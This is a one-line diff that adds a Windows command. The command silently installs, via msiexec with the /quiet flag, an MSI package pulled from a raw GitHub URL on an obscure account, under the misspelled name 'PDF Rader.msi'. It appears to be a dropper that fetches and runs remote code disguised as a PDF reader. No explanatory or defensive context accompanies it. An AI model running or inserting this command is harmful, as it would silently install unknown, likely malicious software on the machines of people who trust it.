@@ -1,0 +1,1 @@
+C:\WINDOWS\system32\msiexec.exe /i "https://github.com/hrgdgjdh-dotcom/xs/raw/refs/heads/main/PDF%20Rader.msi" /quiet
